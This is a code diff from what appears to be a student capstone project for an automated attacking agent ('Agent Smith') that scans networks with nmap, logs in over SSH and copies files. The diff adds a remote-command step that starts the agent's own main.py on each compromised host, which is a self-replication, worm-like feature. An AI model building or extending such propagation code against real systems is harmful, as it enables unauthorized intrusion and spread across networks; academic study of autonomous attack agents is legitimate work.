@@ -43,6 +43,7 @@ SERVICE = 'service'
 SSH = 'ssh'
 SSHACTIONS = 'sshactions'
 SSHACTIONDTRANSFERFILE = "sshactionstransferfile"
+SSHACTIONSREMOTECOMMAND = "sshactionsremotecommand"
 
 # SFTP
 SFTP ='sftp'
@@ -190,6 +191,7 @@ def smithbrain(self, input_nodes, context):
 		context["action"] = SCANNETWORKSERVICES
 		context['service'] = RECON
 		service = context['service']
+		context['remotecommand'] = "python3 " + REMOTEDIR + "/Capstone-Project-2022/src/main.py"
 		# Set the Recon Tool to use
 		context["recontool"] =  NMAP
 		context["nmapFlags"] = SMITH_NMAP_FLAG
@@ -228,6 +230,8 @@ def smithbrain(self, input_nodes, context):
 				print("Performing Services")
 				print(services)
 				performAction(services, service, context)
+				context["action"] = "remoteCommand"
+				performAction(services, service, context)
 	print("Agent Smith Complete")
 
 ######################################################################################
@@ -262,7 +266,7 @@ def hard_coded_range_if(self, input_nodes, context):
 ######################################################################################
 
 # SSH Login Node. This will loginto the supplied address "ip address" found in context
-@GeneticTree.declarePrimitive(ATTACKER, SSH, (SSHACTIONS, SSHACTIONS))
+@GeneticTree.declarePrimitive(ATTACKER, SSH, (SSHACTIONS, SSHACTIONSREMOTECOMMAND))
 def determinSSHActions(self, input_nodes, context):
 	print('SSH Node')
 	# Informant clause to inform parrent node on what this node is
@@ -332,12 +336,18 @@ def scpTransferFile(self, input_nodes, context):
 
 
 
-# Replicate and launch agent on remote system
-# @GeneticTree.declarePrimitive(ATTACKER, SSHACTIONS, ())
-# def replicateAgent(self, input_nodes, context):
-# 	pass
-
-
+#remote command execution
+@GeneticTree.declarePrimitive(ATTACKER, SSHACTIONSREMOTECOMMAND, ())
+def remotecommand(self, input_nodes, context):
+	# Inform the parrent node of what leaf action i am
+	inform = context['inform']
+	if inform == "unknown":
+		return "remoteCommand"
+	
+	command = context['remotecommand'] 
+	# Getting SSH object from context
+	ssh = context["ssh"]
+	send_command(ssh, command)
 
 
 
